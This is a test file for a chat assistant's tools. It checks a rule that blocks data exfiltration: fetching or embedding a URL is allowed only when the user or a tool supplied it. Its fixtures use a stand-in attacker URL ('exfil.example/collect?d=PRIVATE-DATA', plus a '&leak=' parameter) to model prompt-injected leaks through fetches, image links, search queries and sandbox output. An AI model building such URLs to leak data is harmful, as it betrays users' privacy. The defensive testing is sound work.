import { randomUUID } from "node:crypto";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { getConfig } from "$lib/server/config-store";
import { db, sqlite } from "$lib/server/db";
import { conversations, messages, users } from "$lib/server/db/schema";
import { recordParallelUsage } from "$lib/server/services/analytics";
import {
	getConversationFileProductionJob,
	submitFileProductionIntake,
} from "$lib/server/services/file-production";
import type { FileProductionJob } from "$lib/server/services/file-production/types";
import { searchImages } from "$lib/server/services/image-search";
import { fetchUrlViaParallel } from "$lib/server/services/parallel-search/fetch-url";
import { researchWebViaParallel } from "$lib/server/services/parallel-search/research";
import type { GroundedWebResult } from "$lib/server/services/parallel-search/types";
import { executeCode as executeSandboxCode } from "$lib/server/services/sandbox-execution";
import {
	hasSourceHost,
	hasSourceThumbnail,
	NON_PROVENANCE_RESULT_TOOLS,
	PROVENANCE_RESULT_TOOLS,
	resetUrlProvenanceForTests,
} from "$lib/server/services/url-provenance";
import { IMAGE_SEARCH_TOOL } from "$lib/shared/url-provenance";
import { createNormalChatTools } from "./index";
import { resetToolResultCacheForTests } from "./tool-result-cache";

// What the tool set does with the provenance rule of docs/plans/exfil-channels:
// the recorder feeds the user's source ledger, fetch_url opens only addresses the
// user typed or a tool returned, and produce_file leaves out a picture whose
// address has neither source. The model is uncensored and reads pages a stranger
// may have written, so each of these is code, and each is held here.

vi.mock("$lib/server/services/file-production", async () => {
	const { waitForFileProductionJobVerdict } = await import(
		"$lib/server/services/file-production/job-wait"
	);
	return {
		submitFileProductionIntake: vi.fn(),
		getConversationFileProductionJob: vi.fn(),
		waitForFileProductionJobVerdict,
	};
});
vi.mock("$lib/server/services/analytics", () => ({
	recordParallelUsage: vi.fn(),
}));
vi.mock("$lib/server/services/parallel-search/research", () => ({
	researchWebViaParallel: vi.fn(),
}));
vi.mock("$lib/server/services/parallel-search/fetch-url", () => ({
	fetchUrlViaParallel: vi.fn(),
}));
vi.mock("$lib/server/services/sandbox-execution", () => ({
	executeCode: vi.fn(),
}));
vi.mock("$lib/server/services/image-search", () => ({
	searchImages: vi.fn(),
}));
vi.mock("$lib/server/config-store", () => ({
	getConfig: vi.fn(() => ({
		parallelApiKey: "parallel-key",
		parallelBaseUrl: "https://api.parallel.ai",
		model1MaxModelContext: 64_000,
		model2MaxModelContext: 200_000,
	})),
}));

const getConfigMock = vi.mocked(getConfig);
const fetchUrlViaParallelMock = vi.mocked(fetchUrlViaParallel);
const researchWebViaParallelMock = vi.mocked(researchWebViaParallel);
const searchImagesMock = vi.mocked(searchImages);
const executeSandboxCodeMock = vi.mocked(executeSandboxCode);
const submitFileProductionIntakeMock = vi.mocked(submitFileProductionIntake);
const getConversationFileProductionJobMock = vi.mocked(
	getConversationFileProductionJob,
);
const recordParallelUsageMock = vi.mocked(recordParallelUsage);

const THUMB =
	"https://imgs.search.brave.com/Zq3s9x/rs:fit:500:0:0:0/g:ce/aHR0cHM6Ly9leGFtcGxlLmNvbS9jYXQuanBn";
const EXFIL = "https://exfil.example/collect?d=PRIVATE-DATA";

function requireTool<T>(tool: T | undefined): NonNullable<T> {
	if (tool == null) throw new Error("expected tool to be registered");
	return tool as NonNullable<T>;
}

function groundedResult(params: {
	urls: string[];
	markdown?: string;
	failed?: boolean;
}): GroundedWebResult {
	const sources = params.failed
		? []
		: params.urls.map((url, index) => ({
				id: `p${index}`,
				provider: "parallel",
				title: `Page ${index}`,
				url,
				snippet: "A snippet.",
				highlights: ["A highlight."],
				providerRank: index,
				publishedAt: null,
				updatedAt: null,
				authorityClass: "standard" as const,
				authorityScore: 50,
			}));
	return {
		query: params.urls.join(" "),
		queries: [{ query: params.urls.join(" ") }],
		sources,
		evidence: sources.map((source, index) => ({
			id: `p${index}e0`,
			sourceId: source.id,
			title: source.title,
			url: source.url,
			provider: "parallel",
			quote: "A quote.",
			score: 1,
		})),
		answerBrief: {
			markdown: params.markdown ?? "Fetched page brief.",
			instructions: ["Answer only from these sources."],
		},
		diagnostics: {
			mode: "turbo",
			freshness: "auto",
			sourcePolicy: "general",
			plannedQueryCount: 1,
			directUrlCount: params.urls.length,
			fetchedSourceCount: sources.length,
			fusedSourceCount: sources.length,
			selectedSourceCount: sources.length,
			openedPageCount: params.urls.length,
			pageExtraction: {
				attemptedCount: params.urls.length,
				succeededCount: sources.length,
				cacheHitCount: 0,
				lowQualityCount: 0,
				blockedCount: 0,
				failedCount: params.failed ? params.urls.length : 0,
				totalLatencyMs: 0,
			},
			evidenceCandidateCount: sources.length,
			exactEvidenceCandidateCount: 0,
			reranked: false,
			sourceReranked: false,
			fallbackReasons: [],
		},
	} as GroundedWebResult;
}

function makeJob(
	overrides: Partial<FileProductionJob> = {},
): FileProductionJob {
	return {
		id: "job-1",
		conversationId: "conversation-1",
		assistantMessageId: null,
		title: "Generated file",
		status: "queued",
		createdAt: 1,
		updatedAt: 1,
		files: [],
		warnings: [],
		dismissed: false,
		error: null,
		sourceMode: null,
		...overrides,
	};
}

function tools(
	overrides: Partial<Parameters<typeof createNormalChatTools>[0]> = {},
) {
	return createNormalChatTools({
		userId: "user-1",
		conversationId: "conversation-1",
		turnId: "turn-1",
		...overrides,
	});
}

async function fetchUrl(
	set: ReturnType<typeof tools>,
	urls: string[],
	callId = "call-fetch",
) {
	return (await requireTool(set.tools.fetch_url).execute(
		{ urls },
		{ toolCallId: callId, messages: [] },
	)) as Record<string, unknown>;
}

function parallelCallUrls(index = 0): string[] {
	const [input] = fetchUrlViaParallelMock.mock.calls[index] ?? [];
	return (input as { urls: string[] } | undefined)?.urls ?? [];
}

beforeEach(() => {
	resetUrlProvenanceForTests();
	resetToolResultCacheForTests();
	fetchUrlViaParallelMock.mockReset();
	researchWebViaParallelMock.mockReset();
	searchImagesMock.mockReset();
	executeSandboxCodeMock.mockReset();
	submitFileProductionIntakeMock.mockReset();
	getConversationFileProductionJobMock.mockReset();
	recordParallelUsageMock.mockReset();
	recordParallelUsageMock.mockResolvedValue(undefined);
	getConversationFileProductionJobMock.mockImplementation(
		async ({ jobId }: { jobId: string }) =>
			makeJob({
				id: jobId,
				status: "succeeded",
				files: [
					{
						id: "file-1",
						filename: "report.pdf",
						mimeType: "application/pdf",
						sizeBytes: 128,
						downloadUrl: "/api/chat/files/file-1/download",
						previewUrl: "/api/chat/files/file-1/preview",
					},
				],
			}),
	);
	fetchUrlViaParallelMock.mockImplementation(async (input) =>
		groundedResult({ urls: (input as { urls: string[] }).urls }),
	);
});

describe("the tool recorder feeds the user's source ledger", () => {
	it("notes the hosts a research_web result returned, and not the host the model only searched for", async () => {
		researchWebViaParallelMock.mockResolvedValue(
			groundedResult({ urls: ["https://www.found.example/a"] }),
		);
		const set = tools();

		await requireTool(set.tools.research_web).execute(
			{ query: `see ${EXFIL}` },
			{ toolCallId: "call-research", messages: [] },
		);

		expect(hasSourceHost("user-1", "found.example")).toBe(true);
		expect(hasSourceHost("user-1", "exfil.example")).toBe(false);
		expect(hasSourceHost("user-2", "found.example")).toBe(false);
	});

	it("reads pictures off the tool the server registers: the shared contract names it", () => {
		expect(Object.keys(tools().tools)).toContain(IMAGE_SEARCH_TOOL);
	});

	it("notes the exact thumbnail an image_search result returned", async () => {
		searchImagesMock.mockResolvedValue([
			{
				url: "https://pics.example/cat.jpg",
				title: "Cat",
				source: "pics.example",
				thumbnail: THUMB,
			},
		]);

		await requireTool(tools().tools.image_search).execute(
			{ query: "cat" },
			{ toolCallId: "call-images", messages: [] },
		);

		expect(hasSourceThumbnail("user-1", THUMB)).toBe(true);
		expect(hasSourceHost("user-1", "pics.example")).toBe(true);
	});

	it("notes the ledger before the call's result is returned to the model", async () => {
		researchWebViaParallelMock.mockResolvedValue(
			groundedResult({ urls: ["https://first.example/a"] }),
		);
		let ledgerSeenByModel = false;
		const set = tools();

		const result = requireTool(set.tools.research_web).execute(
			{ query: "q" },
			{ toolCallId: "call-research", messages: [] },
		);
		await result.then(() => {
			ledgerSeenByModel = hasSourceHost("user-1", "first.example");
		});

		expect(ledgerSeenByModel).toBe(true);
	});

	it("writes nothing to the database, whatever the tools return", async () => {
		const changes = () =>
			(sqlite.prepare("SELECT total_changes() AS n").get() as { n: number }).n;
		researchWebViaParallelMock.mockResolvedValue(
			groundedResult({ urls: ["https://found.example/a"] }),
		);
		searchImagesMock.mockResolvedValue([
			{
				url: "https://pics.example/cat.jpg",
				title: "Cat",
				source: "x",
				thumbnail: THUMB,
			},
		]);
		const before = changes();
		const set = tools({ requestText: "read https://example.com/page" });

		await requireTool(set.tools.research_web).execute(
			{ query: "q" },
			{ toolCallId: "call-research", messages: [] },
		);
		await requireTool(set.tools.image_search).execute(
			{ query: "cat" },
			{ toolCallId: "call-images", messages: [] },
		);
		await fetchUrl(set, ["https://example.com/page", EXFIL]);

		expect(changes()).toBe(before);
	});
});

describe("fetch_url opens only an address the user typed or a tool returned", () => {
	it("never calls Parallel for an address that came from neither, and says so in the turn's language", async () => {
		const set = tools();

		const result = await fetchUrl(set, [EXFIL]);

		expect(fetchUrlViaParallelMock).not.toHaveBeenCalled();
		expect(recordParallelUsageMock).not.toHaveBeenCalled();
		expect(result.success).toBe(false);
		expect(String(result.error)).toMatch(/research_web/);
		expect(String(result.error)).toMatch(/neither the user/i);
		// The refused address is the model's own words: it is never handed back.
		expect(JSON.stringify(result)).not.toContain("exfil.example");
		expect(JSON.stringify(result)).not.toContain("PRIVATE-DATA");
	});

	it("answers in Hungarian on a Hungarian turn", async () => {
		const result = await fetchUrl(tools({ language: "hu" }), [EXFIL]);

		expect(fetchUrlViaParallelMock).not.toHaveBeenCalled();
		expect(String(result.error)).toMatch(/research_web/);
		expect(String(result.error)).toMatch(/Semmi nem lett letöltve/);
		expect(JSON.stringify(result)).not.toContain("exfil.example");
	});

	it("keeps the refused address only in the call's own input, and counts it", async () => {
		const set = tools();

		await fetchUrl(set, [EXFIL], "call-refused");

		const [entry] = set.getToolCalls();
		expect(entry).toMatchObject({
			callId: "call-refused",
			name: "fetch_url",
			input: { urls: [EXFIL] },
			status: "done",
			candidates: [],
			metadata: { ok: false, evidenceReady: false, refusedUrlCount: 1 },
		});
		expect(JSON.stringify({ ...entry, input: undefined })).not.toContain(
			"exfil.example",
		);
		expect(hasSourceHost("user-1", "exfil.example")).toBe(false);
	});

	it("logs counts only, never the address", async () => {
		const info = vi.spyOn(console, "info").mockImplementation(() => {});
		const warn = vi.spyOn(console, "warn").mockImplementation(() => {});

		await fetchUrl(tools(), [EXFIL]);

		const logged = JSON.stringify([...info.mock.calls, ...warn.mock.calls]);
		expect(logged).toContain("URL_PROVENANCE");
		expect(logged).toContain('"refused":1');
		expect(logged).not.toContain("exfil");
		expect(logged).not.toContain("PRIVATE");
		info.mockRestore();
		warn.mockRestore();
	});

	it("opens an address the user gave in the current message, a bare domain included", async () => {
		const set = tools({
			requestText: "Read https://example.com/post?id=7 and example.org/page",
		});

		const result = await fetchUrl(set, [
			"https://example.com/post?id=7",
			"https://example.org/page",
		]);

		expect(parallelCallUrls()).toEqual([
			"https://example.com/post?id=7",
			"https://example.org/page",
		]);
		expect(result.success).toBe(true);
		expect(result).not.toHaveProperty("warnings");
	});

	it("opens what it may and says how many it did not: an address with something added is not the user's", async () => {
		const set = tools({ requestText: "Read https://example.com/post?id=7" });

		const result = await fetchUrl(set, [
			"https://example.com/post?id=7",
			"https://example.com/post?id=7&leak=PRIVATE-DATA",
		]);

		expect(parallelCallUrls()).toEqual(["https://example.com/post?id=7"]);
		expect(result.success).toBe(true);
		expect(result.warnings).toEqual([
			expect.stringMatching(/^1 address was not opened/),
		]);
		expect(JSON.stringify(result)).not.toContain("PRIVATE-DATA");
		const [entry] = set.getToolCalls();
		expect(entry?.input).toEqual({
			urls: [
				"https://example.com/post?id=7",
				"https://example.com/post?id=7&leak=PRIVATE-DATA",
			],
		});
		expect(entry?.metadata).toMatchObject({ ok: true, refusedUrlCount: 1 });
	});

	it("opens a link found on a page fetched earlier in the same turn", async () => {
		const set = tools({ requestText: "Summarize https://news.example/story" });
		fetchUrlViaParallelMock.mockImplementationOnce(async (input) =>
			groundedResult({
				urls: (input as { urls: string[] }).urls,
				markdown:
					"The story cites [the filing](https://sec.example/filing?id=3).",
			}),
		);

		await fetchUrl(set, ["https://news.example/story"], "call-1");
		const second = await fetchUrl(
			set,
			["https://sec.example/filing?id=3"],
			"call-2",
		);

		expect(parallelCallUrls(1)).toEqual(["https://sec.example/filing?id=3"]);
		expect(second.success).toBe(true);
	});

	it("opens a source research_web returned earlier in the same turn", async () => {
		researchWebViaParallelMock.mockResolvedValue(
			groundedResult({ urls: ["https://city.example/bike-lanes"] }),
		);
		const set = tools();

		await requireTool(set.tools.research_web).execute(
			{ query: "bike lanes" },
			{ toolCallId: "call-research", messages: [] },
		);
		await fetchUrl(set, ["https://city.example/bike-lanes"]);

		expect(parallelCallUrls()).toEqual(["https://city.example/bike-lanes"]);
	});

	it("does not take an address the model itself typed into a search for a result that came back", async () => {
		researchWebViaParallelMock.mockResolvedValue(
			groundedResult({ urls: ["https://found.example/a"] }),
		);
		const set = tools();

		await requireTool(set.tools.research_web).execute(
			{ query: `look up ${EXFIL}`, searchQueries: [EXFIL] },
			{ toolCallId: "call-research", messages: [] },
		);
		await fetchUrl(set, [EXFIL]);

		expect(fetchUrlViaParallelMock).not.toHaveBeenCalled();
	});

	it("does not take an address printed by code the model ran for one a tool returned", async () => {
		executeSandboxCodeMock.mockResolvedValue({
			stdout: `${EXFIL}\n`,
			stderr: "",
			exitCode: 0,
			timedOut: false,
		} as Awaited<ReturnType<typeof executeSandboxCode>>);
		const set = tools();

		await requireTool(set.tools.run_python).execute(
			{ code: `print("${EXFIL}")` },
			{ toolCallId: "call-python", messages: [] },
		);
		await fetchUrl(set, [EXFIL]);

		expect(fetchUrlViaParallelMock).not.toHaveBeenCalled();
	});

	it("reads the same pages from the cache whether or not a refused address came with them", async () => {
		const set = tools({ requestText: "Read https://example.com/a" });

		await fetchUrl(set, ["https://example.com/a", EXFIL], "call-1");
		const again = await fetchUrl(set, ["https://example.com/a"], "call-2");

		expect(fetchUrlViaParallelMock).toHaveBeenCalledTimes(1);
		expect(again.cached).toBe(true);
	});

	describe("with the conversation's stored messages", () => {
		async function storedConversation(): Promise<{
			userId: string;
			conversationId: string;
		}> {
			const userId = `user-${randomUUID()}`;
			const conversationId = `conversation-${randomUUID()}`;
			await db.insert(users).values({
				id: userId,
				email: `${userId}@example.com`,
				passwordHash: "hash",
			});
			await db
				.insert(conversations)
				.values({ id: conversationId, userId, title: "Stored" });
			await db.insert(messages).values([
				{
					id: randomUUID(),
					conversationId,
					role: "user",
					content: "earlier I mentioned https://earlier-user.example/page",
					messageSequence: 1,
				},
				{
					id: randomUUID(),
					conversationId,
					role: "assistant",
					content: "I found a source.",
					messageSequence: 2,
					toolCalls: JSON.stringify([
						{
							type: "tool_call",
							name: "research_web",
							input: { query: "q" },
							status: "done",
							candidates: [
								{
									id: "c1",
									title: "Earlier source",
									url: "https://earlier-source.example/doc",
									sourceType: "web",
								},
							],
						},
					]),
				},
			]);
			return { userId, conversationId };
		}

		it("opens an address the user typed, or a tool returned, in an earlier turn", async () => {
			const { userId, conversationId } = await storedConversation();
			const set = tools({ userId, conversationId });

			await fetchUrl(set, [
				"https://earlier-user.example/page",
				"https://earlier-source.example/doc",
				"https://never-seen.example/",
			]);

			expect(parallelCallUrls()).toEqual([
				"https://earlier-user.example/page",
				"https://earlier-source.example/doc",
			]);
		});

		it("reads nothing of another user's conversation", async () => {
			const { conversationId } = await storedConversation();
			const set = tools({ userId: "someone-else", conversationId });

			await fetchUrl(set, ["https://earlier-user.example/page"]);

			expect(fetchUrlViaParallelMock).not.toHaveBeenCalled();
		});
	});
});

describe("produce_file leaves out a picture whose address has no source", () => {
	const documentWith = (...images: unknown[]) => ({
		blocks: [
			{ type: "paragraph", text: "Report body with enough words to count." },
			...images,
		],
	});
	const httpsImage = (url: string, altText = "A picture") => ({
		type: "image",
		source: { kind: "https", url },
		altText,
	});
	const request = (documentSource: unknown) => ({
		requestTitle: "Picture report",
		requestedOutputs: [{ type: "pdf" }],
		sourceMode: "document_source",
		documentSource,
	});

	beforeEach(() => {
		submitFileProductionIntakeMock.mockResolvedValue({
			ok: true,
			status: 202,
			reused: false,
			job: makeJob({ id: "job-pictures", title: "Picture report" }),
		});
	});

	function intakeBlocks(index = 0): Array<Record<string, unknown>> {
		const call = submitFileProductionIntakeMock.mock.calls[index]?.[0] as
			| {
					body: {
						documentSource?: { blocks?: Array<Record<string, unknown>> };
					};
			  }
			| undefined;
		return call?.body.documentSource?.blocks ?? [];
	}

	it("drops an https picture nobody gave, keeps one the user gave and an inline one, and says how many", async () => {
		const set = tools({
			requestText: "Add the photo from https://user-photo.example/cat.png",
		});
		const inline = {
			type: "image",
			source: { kind: "data", mimeType: "image/png", data: "iVBORw0KGgo=" },
			altText: "Inline",
		};

		const result = (await set.tools.produce_file.execute(
			request(
				documentWith(
					httpsImage(EXFIL, "Leak"),
					httpsImage("https://user-photo.example/cat.png", "Cat"),
					inline,
				),
			),
			{ toolCallId: "call-pictures", messages: [] },
		)) as { warnings?: string[] };

		const blocks = intakeBlocks();
		const urls = blocks
			.filter((block) => block.type === "image")
			.map((block) => (block.source as { url?: string }).url ?? "inline");
		expect(urls).toEqual(["https://user-photo.example/cat.png", "inline"]);
		expect(result.warnings).toEqual([
			expect.stringMatching(/^1 image was left out of the document/),
		]);
		expect(JSON.stringify(result)).not.toContain("exfil.example");
		expect(JSON.stringify(set.getToolCalls())).not.toContain("exfil.example");
	});

	it("keeps a picture a search returned in this turn", async () => {
		searchImagesMock.mockResolvedValue([
			{
				url: "https://pics.example/cat.jpg",
				title: "Cat",
				source: "pics.example",
				thumbnail: THUMB,
			},
		]);
		const set = tools();
		await requireTool(set.tools.image_search).execute(
			{ query: "cat" },
			{ toolCallId: "call-images", messages: [] },
		);

		const result = (await set.tools.produce_file.execute(
			request(documentWith(httpsImage("https://pics.example/cat.jpg"))),
			{ toolCallId: "call-pictures", messages: [] },
		)) as { warnings?: string[] };

		expect(
			intakeBlocks().filter((block) => block.type === "image"),
		).toHaveLength(1);
		expect(result.warnings).toBeUndefined();
	});

	it("says it in Hungarian on a Hungarian turn", async () => {
		const set = tools({ language: "hu" });

		const result = (await set.tools.produce_file.execute(
			request(documentWith(httpsImage(EXFIL))),
			{ toolCallId: "call-pictures", messages: [] },
		)) as { warnings?: string[] };

		expect(result.warnings?.[0]).toMatch(/kép kimaradt a dokumentumból/);
	});

	it("leaves a document with no refused picture exactly as it was, with no warning", async () => {
		const set = tools();

		const result = (await set.tools.produce_file.execute(
			request(documentWith()),
			{ toolCallId: "call-pictures", messages: [] },
		)) as { warnings?: string[] };

		expect(intakeBlocks()).toHaveLength(1);
		expect(result.warnings).toBeUndefined();
	});

	it("counts a resend with the same refused picture as the same request: one job, not two", async () => {
		const set = tools();
		const send = (callId: string, url: string) =>
			set.tools.produce_file.execute(request(documentWith(httpsImage(url))), {
				toolCallId: callId,
				messages: [],
			});

		const first = (await send("call-1", EXFIL)) as { jobId?: string };
		// A different refused address leaves the same document behind it.
		const second = (await send("call-2", "https://other.example/x.png")) as {
			reused?: boolean;
			jobId?: string;
		};

		expect(submitFileProductionIntakeMock).toHaveBeenCalledTimes(1);
		expect(second.reused).toBe(true);
		expect(second.jobId).toBe(first.jobId);
	});
});

describe("every tool of the catalogue is classified for the provenance rule", () => {
	it("puts each registered tool in exactly one of the two lists, so a new tool is a decision, not a default", () => {
		getConfigMock.mockReturnValueOnce({
			parallelApiKey: "parallel-key",
			parallelBaseUrl: "https://api.parallel.ai",
			orsBaseUrl: "http://127.0.0.1:8080/ors",
			geocoderBaseUrl: "http://127.0.0.1:2322",
			model1MaxModelContext: 64_000,
			model2MaxModelContext: 200_000,
		} as unknown as ReturnType<typeof getConfig>);
		const names = Object.keys(
			createNormalChatTools({
				userId: "user-1",
				conversationId: "conversation-1",
				turnId: "turn-1",
				enabledConnectionCapabilities: new Set([
					"files",
					"calendar",
					"email",
					"photos",
					"media",
					"location",
					"contacts",
					"repos",
					"tasks",
				]),
			}).tools,
		);

		expect(names).toContain("map_route");
		expect(names.length).toBeGreaterThan(20);
		for (const name of names) {
			const classified =
				Number(PROVENANCE_RESULT_TOOLS.has(name)) +
				Number(NON_PROVENANCE_RESULT_TOOLS.has(name));
			expect(
				classified,
				`${name} must be in PROVENANCE_RESULT_TOOLS or NON_PROVENANCE_RESULT_TOOLS (url-provenance/turn.ts)`,
			).toBe(1);
		}
	});
});
